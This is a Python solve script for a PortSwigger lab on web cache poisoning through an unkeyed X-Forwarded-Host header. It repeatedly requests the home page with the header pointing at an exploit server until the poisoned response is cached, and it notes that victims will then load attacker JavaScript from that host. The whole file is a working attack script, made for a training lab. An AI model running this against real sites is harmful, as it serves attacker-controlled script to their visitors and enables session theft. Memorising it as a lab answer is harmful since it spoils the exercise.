#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Web cache poisoning with an unkeyed header.

Sends GET / with X-Forwarded-Host pointing to the exploit server
until X-Cache: hit is observed, confirming the poisoned response is cached.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(
        description="Solve Web Cache Poisoning Lab 1 (unkeyed header)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("exploit_host", help="Exploit server hostname (no https://)")
    parser.add_argument("--max-attempts", type=int, default=20)
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    print(f"[*] Poisoning cache with X-Forwarded-Host: {args.exploit_host}")
    for i in range(1, args.max_attempts + 1):
        r = s.get(
            f"{lab}/",
            headers={"X-Forwarded-Host": args.exploit_host},
        )
        cache_status = r.headers.get("X-Cache", "none")
        print(f"[{i}] X-Cache: {cache_status}")
        if cache_status == "hit":
            print(f"[+] Cache poisoned! Victims loading {lab}/ will execute your script.")
            print(f"[*] Make sure {args.exploit_host}/resources/js/tracking.js serves your payload.")
            return

    print("[-] Cache hit not observed — try more attempts or check the unkeyed header name.")


if __name__ == "__main__":
    main()
